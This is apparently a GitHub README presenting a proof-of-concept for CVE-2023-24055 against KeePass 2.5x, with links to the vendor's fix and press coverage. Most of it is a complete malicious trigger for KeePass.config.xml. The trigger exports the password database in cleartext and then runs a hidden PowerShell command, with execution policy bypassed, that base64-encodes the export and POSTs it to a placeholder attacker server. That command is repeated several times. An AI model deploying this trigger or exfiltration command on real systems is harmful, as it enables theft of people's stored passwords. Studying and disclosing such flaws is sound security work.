# CVE-2023-24055 PoC (KeePass 2.5x)

<p align="center">
<img src="https://user-images.githubusercontent.com/3140111/214475585-9cfec961-c050-45e8-af1c-4a14e6e92a29.png">
</p>

## Under discussion and analysis...</br> 
https://sourceforge.net/p/keepass/discussion/329220/thread/a146e5cf6b/ </br>
https://sourceforge.net/p/keepass/feature-requests/2773/ </br>

An attacker who has write access to the KeePass configuration file can modify it and inject malicious triggers, e.g to obtain the cleartext passwords by adding an export trigger.

https://nvd.nist.gov/vuln/detail/CVE-2023-24055 </br>
https://www.cve.org/CVERecord?id=CVE-2023-24055 </br>

## My early PoC (KeePass 2.5x)

(1) An attacker who has write access to the KeePass configuration file ``KeePass.config.xml`` could inject  the following trigger,  e.g:  
```ruby
<?xml version="1.0" encoding="utf-8"?>
<TriggerCollection xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
	<Triggers>
		<Trigger>
			<Guid>lztpSRd56EuYtwwqntH7TQ==</Guid>
			<Name>exploit</Name>
			<Events>
				<Event>
					<TypeGuid>s6j9/ngTSmqcXdW6hDqbjg==</TypeGuid>
					<Parameters>
						<Parameter>0</Parameter>
						<Parameter />
					</Parameters>
				</Event>
			</Events>
			<Conditions />
			<Actions>
				<Action>
					<TypeGuid>D5prW87VRr65NO2xP5RIIg==</TypeGuid>
					<Parameters>
						<Parameter>c:\Users\John\AppData\Local\Temp\exploit.xml</Parameter>
						<Parameter>KeePass XML (2.x)</Parameter>
						<Parameter />
						<Parameter />
					</Parameters>
				</Action>
				<Action>
					<TypeGuid>2uX4OwcwTBOe7y66y27kxw==</TypeGuid>
					<Parameters>
						<Parameter>PowerShell.exe</Parameter>
						<Parameter>-ex bypass -noprofile -c Invoke-WebRequest -uri http://attacker_server_here/exploit.raw -Method POST -Body ([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('c:\Users\John\AppData\Local\Temp\exploit.xml'))) </Parameter>
						<Parameter>False</Parameter>
						<Parameter>1</Parameter>
						<Parameter />
					</Parameters>
				</Action>
			</Actions>
		</Trigger>
	</Triggers>
</TriggerCollection>
```
(2) Victim will open the keePass as normally activity , saving changes, etc...., the trigger will executed on background  exfiltrating the credentials to attacker server

## Trigger PoC details
a) The trigger will export the keepass database in ``KeePass XML (2.x) format`` included all the credentials ``(cleartext)``  into folowing path,  e.g:

```ruby
c:\Users\John\AppData\Local\Temp\exploit.xml 
```
b) Once exported the file , a second action could be defined to exfiltrate the XML data using ``Powershell.exe`` and encoded to ``base64`` e.g:

```ruby
PowerShell.exe -ex bypass -noprofile -c Invoke-WebRequest -uri http://attacker_server_here/exploit.raw -Method POST -Body ([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('c:\Users\John\AppData\Local\Temp\exploit.xml')))
```
c) Data will exfiltrate to attacker web server e.g:

![1](https://user-images.githubusercontent.com/3140111/214494607-2b939bae-02ae-4515-9082-da68e07d4bcb.png)

## Trigger PoC values

```ruby
Name: Trigger
Events: Saved database file | [Equals]
Conditions: <empty>
Actions: 

(1) Export active database 
File/URL: c:\Users\John\AppData\Local\Temp\exploit.xml
File/Format:  KeePass XML (2.x)

(2) Execute command line / URL
File/URL: PowerShell.exe
Arguments: -ex bypass -noprofile -c Invoke-WebRequest -uri http://attacker_server_here/exploit.raw -Method POST -Body ([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('c:\Users\John\AppData\Local\Temp\exploit.xml')))
Window style: Hidden
```
 Credentials... 
```ruby
PS C:\Users\John\AppData\Local\Temp> type .\exploit.xml  | Select-String -Pattern Password
```
![2](https://user-images.githubusercontent.com/3140111/214488749-fa900ae4-9a9f-4101-af5a-bbbaeec88184.png)

![3](https://user-images.githubusercontent.com/3140111/214490119-eb0c729a-8157-4ca6-889b-2b77cf6eeb6a.png)

## Trigger public examples: 
https://keepass.info/help/kb/trigger_examples.html </br>

## Fix Released : Changes from 2.53 to 2.53.1:
https://keepass.info/news/n230109_2.53.html
```ruby
Removed the 'Export - No Key Repeat' application policy flag; KeePass now always asks for the current master key when trying to export data.
``` 
## Further readings
### (*) What this KeePass CVE means for organizations searching for new password vaults (Carlos Perez)
https://www.trustedsec.com/blog/what-this-keepass-cve-means-for-organizations-searching-for-new-password-vaults/ </br>
https://www.youtube.com/watch?v=OEaFaSjaZY4  </br>

### (*) KeePass disputes report of flaw that could exfiltrate a database (Steve Zurier)
https://www.scmagazine.com/analysis/identity-and-access/keepass-disputes-report-of-flaw-that-could-exfiltrate-a-database  </br>

### (*) Security Weekly News (06:56 KeePass) 
https://www.youtube.com/watch?v=iz0PsYlH8Ig  </br>

### (*) KeePass 2.53.1, une nouvelle version qui corrige « la vulnérabilité » CVE-2023-24055 (IT Connect FR)
https://www.it-connect.fr/keepass-2-53-1-une-nouvelle-version-qui-corrige-la-vulnerabilite/ </br>
https://www.it-connect.fr/faille-critique-dans-keepass-un-attaquant-peut-exporter-les-mots-de-passe-en-clair/ </br>

### (*) Tools
https://github.com/deetl/CVE-2023-24055 </br>
https://blog.harmj0y.net/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/ </br>
https://github.com/Orange-Cyberdefense/KeePwn </br>

# Author
Alex Hernandez aka <em><a href="https://twitter.com/_alt3kx_" rel="nofollow">(@\_alt3kx\_)</a></em>



